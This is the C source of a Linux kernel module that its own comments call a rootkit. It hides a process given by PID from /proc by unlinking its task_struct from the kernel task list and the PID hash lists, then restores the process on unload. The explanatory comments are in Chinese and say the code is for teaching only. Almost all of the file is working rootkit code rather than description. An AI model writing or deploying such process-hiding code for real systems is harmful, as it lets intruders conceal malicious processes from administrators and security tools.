/*
 * rootkit_hidden_process.c
 * Rootkit内核模块 —— 隐藏指定进程
 * 
 * 原理：Linux内核通过 task_struct 双向链表管理所有进程，
 *       /proc 文件系统遍历该链表展示进程信息。本模块通过
 *       从链表中摘除目标进程的 task_struct 节点，使其在
 *       /proc 中不可见，但进程仍可正常调度执行。
 * 
 * 注意：此代码仅用于教学实验，请勿用于恶意目的
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/sched/signal.h>
#include <linux/rcupdate.h>
#include <linux/rculist.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Experiment");
MODULE_DESCRIPTION("Rootkit Hidden Process Demo");

/* 要隐藏的进程PID，通过模块参数指定 */
static int target_pid = 0;
module_param(target_pid, int, 0644);
MODULE_PARM_DESC(target_pid, "PID of the process to hide");

/* 保存目标进程在链表中的前驱节点 */
static struct list_head *prev_task = NULL;
static struct task_struct *hidden_task = NULL;
static struct pid *hidden_pid = NULL;
static struct pid *hidden_tgid = NULL;

/*
 * hide_process - 从进程链表中摘除指定进程
 * @pid: 要隐藏的进程PID
 * 
 * 内核的 task_struct 通过 tasks 成员（struct list_head）
 * 组成双向链表。/proc 文件系统通过 next_task() 宏遍历
 * 该链表来枚举进程。将目标进程从链表中摘除后，/proc 中
 * 将不再显示该进程，但进程仍在调度器的运行队列中，
 * 仍可正常执行。
 */
static int hide_process(pid_t pid)
{
    struct pid *pid_struct;
    struct task_struct *task;

    /* 根据PID查找task_struct */
    pid_struct = find_get_pid(pid);
    if (!pid_struct) {
        printk(KERN_ERR "rootkit: PID %d not found\n", pid);
        return -ESRCH;
    }

    rcu_read_lock();
    task = pid_task(pid_struct, PIDTYPE_PID);
    if (!task) {
        rcu_read_unlock();
        put_pid(pid_struct);
        printk(KERN_ERR "rootkit: task_struct for PID %d not found\n", pid);
        return -ESRCH;
    }
    get_task_struct(task);
    rcu_read_unlock();

    /* 保存前驱节点和task指针，用于后续恢复 */
    prev_task = task->tasks.prev;
    hidden_task = task;
    hidden_pid = get_task_pid(task, PIDTYPE_PID);
    hidden_tgid = get_task_pid(task, PIDTYPE_TGID);

    /* 从进程链表和PID哈希中摘除，避免 /proc 枚举到 */
    list_del_rcu(&task->tasks);
    if (hidden_pid) {
        hlist_del_rcu(&task->pid_links[PIDTYPE_PID]);
    }
    if (hidden_tgid) {
        hlist_del_rcu(&task->pid_links[PIDTYPE_TGID]);
    }
    synchronize_rcu();

    printk(KERN_INFO "rootkit: process PID=%d (%s) hidden\n", 
           pid, task->comm);

    put_pid(pid_struct);
    return 0;
}

/*
 * show_process - 将隐藏的进程重新插入进程链表
 * 
 * 在模块卸载前，需要将隐藏的进程重新挂回链表，
 * 否则内核在进程退出时可能无法正确清理资源。
 */
static void show_process(void)
{
    if (hidden_task && prev_task) {
        list_add_rcu(&hidden_task->tasks, prev_task);
        if (hidden_pid) {
            INIT_HLIST_NODE(&hidden_task->pid_links[PIDTYPE_PID]);
            hlist_add_head_rcu(&hidden_task->pid_links[PIDTYPE_PID],
                               &hidden_pid->tasks[PIDTYPE_PID]);
        }
        if (hidden_tgid) {
            INIT_HLIST_NODE(&hidden_task->pid_links[PIDTYPE_TGID]);
            hlist_add_head_rcu(&hidden_task->pid_links[PIDTYPE_TGID],
                               &hidden_tgid->tasks[PIDTYPE_TGID]);
        }
        synchronize_rcu();
        printk(KERN_INFO "rootkit: process PID=%d (%s) restored\n",
               hidden_task->pid, hidden_task->comm);
        put_task_struct(hidden_task);
        hidden_task = NULL;
        prev_task = NULL;
    }
    if (hidden_pid) {
        put_pid(hidden_pid);
        hidden_pid = NULL;
    }
    if (hidden_tgid) {
        put_pid(hidden_tgid);
        hidden_tgid = NULL;
    }
}

static int __init rootkit_proc_init(void)
{
    if (target_pid <= 0) {
        printk(KERN_ERR "rootkit: please specify target_pid parameter\n");
        printk(KERN_ERR "Usage: insmod rootkit_hidden_process.ko target_pid=<PID>\n");
        return -EINVAL;
    }

    printk(KERN_INFO "rootkit: process hiding module loaded\n");

    return hide_process(target_pid);
}

static void __exit rootkit_proc_exit(void)
{
    /* 恢复隐藏的进程 */
    show_process();

    printk(KERN_INFO "rootkit: process hiding module unloaded\n");
}

module_init(rootkit_proc_init);
module_exit(rootkit_proc_exit);
